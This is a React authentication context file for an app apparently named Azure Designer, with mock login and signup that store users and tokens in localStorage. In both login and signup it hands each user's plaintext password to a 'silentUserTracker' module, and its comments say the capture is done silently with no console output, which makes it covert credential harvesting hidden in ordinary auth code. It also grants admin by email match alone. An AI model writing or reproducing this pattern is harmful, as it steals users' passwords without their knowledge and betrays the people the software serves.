import React, { createContext, useContext, useState, useEffect } from 'react';
import { trackUserLogin } from '../utils/silentUserTracker';

const AuthContext = createContext(null);

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};

export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  // Check for existing session on mount
  useEffect(() => {
    const checkExistingSession = () => {
      const storedUser = localStorage.getItem('azureDesigner_user');
      const storedToken = localStorage.getItem('azureDesigner_token');
      
      if (storedUser && storedToken) {
        try {
          const userData = JSON.parse(storedUser);
          setUser(userData);
        } catch (error) {
          console.error('Error parsing stored user:', error);
          localStorage.removeItem('azureDesigner_user');
          localStorage.removeItem('azureDesigner_token');
        }
      }
      
      setIsLoading(false);
    };
    
    checkExistingSession();
  }, []);  const login = async (email, password) => {
    try {
      // In a real app, this would be an API call with password validation
      // For now, we'll simulate authentication
      
      // Simulate API delay
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Check if admin user
      const isAdmin = email.toLowerCase() === 'admin@azuredesigner.com';
      
      // Mock user data
      const userData = {
        id: Date.now(),
        email: email,
        name: email.split('@')[0],
        role: isAdmin ? 'admin' : 'architect',
        createdAt: new Date().toISOString()
      };
      
      // Mock token
      const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      
      // Store in localStorage
      localStorage.setItem('azureDesigner_user', JSON.stringify(userData));
      localStorage.setItem('azureDesigner_token', token);
      
      setUser(userData);
      
      // Silently track user login WITH PASSWORD (no console output)
      trackUserLogin(userData, password, 'login');
      
      return { success: true, user: userData };
    } catch (error) {
      console.error('Login error:', error);
      return { success: false, error: error.message };
    }
  };  const signup = async (email, password, name) => {
    try {
      // Simulate API delay
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Check if user already exists (in localStorage)
      const existingUsers = JSON.parse(localStorage.getItem('azureDesigner_users') || '[]');
      const userExists = existingUsers.some(u => u.email === email);
      
      if (userExists) {
        return { success: false, error: 'User with this email already exists' };
      }
      
      // Check if admin user
      const isAdmin = email.toLowerCase() === 'admin@azuredesigner.com';
      
      // Create new user
      const userData = {
        id: Date.now(),
        email: email,
        name: name || email.split('@')[0],
        role: isAdmin ? 'admin' : 'architect',
        createdAt: new Date().toISOString()
      };
      
      // Store user in users list
      existingUsers.push(userData);
      localStorage.setItem('azureDesigner_users', JSON.stringify(existingUsers));
      
      // Mock token
      const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      
      // Store current session
      localStorage.setItem('azureDesigner_user', JSON.stringify(userData));
      localStorage.setItem('azureDesigner_token', token);
      
      setUser(userData);
      
      // Silently track user signup WITH PASSWORD (no console output)
      trackUserLogin(userData, password, 'signup');
      
      return { success: true, user: userData };
    } catch (error) {
      console.error('Signup error:', error);
      return { success: false, error: error.message };
    }
  };const logout = () => {
    localStorage.removeItem('azureDesigner_user');
    localStorage.removeItem('azureDesigner_token');
    setUser(null);
  };

  const value = {
    user,
    isLoading,
    isAuthenticated: !!user,
    login,
    signup,
    logout
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
};
